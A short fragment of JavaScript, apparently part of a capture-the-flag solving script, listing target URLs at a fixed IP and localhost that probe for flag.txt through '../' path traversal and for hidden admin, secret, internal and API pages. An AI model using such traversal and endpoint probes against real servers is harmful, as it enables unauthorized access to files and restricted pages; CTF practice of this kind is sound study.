...
`;
    ...
    const targetPages = [
        ...
        { url: 'http://34.78.15.179', name: 'index' },
        { url: 'http://34.78.15.179/flag.txt', name: 'quiz1' },
      { url: 'http://34.78.15.179/../flag.txt', name: 'quiz2' },
      { url: 'http://34.78.15.179/admin', name: 'quiz3' },
      { url: 'http://34.78.15.179/app/flag.txt', name: 'quiz4' },
      { url: 'http://34.78.15.179/../../../../flag.txt', name: 'quiz5' },
        
        // Path traversal attempts
        { url: 'http://localhost/flag.txt', name: 'flag-traversal' },
        { url: 'http://localhost/app/flag.txt', name: 'package' },
        { url: 'http://localhost/../../../../flag.txt', name: 'bot-source' },
        
        // Possible hidden pages
        { url: 'http://localhost/admin', name: 'admin' },
        { url: 'http://localhost/flag', name: 'flag-page' },
        { url: 'http://localhost/secret', name: 'secret' },
        { url: 'http://localhost/internal', name: 'internal' },
        
        // Quiz variations
        { url: 'http://localhost/quiz', name: 'quiz-page' },
        { url: 'http://localhost/quiz.json', name: 'quiz-json' },
        
        // API endpoints
        { url: 'http://localhost/api', name: 'api-root' },
        { url: 'http://localhost/api/flag', name: 'api-flag' },
        { url: 'http://localhost/api/admin', name: 'api-admin' }
    ];
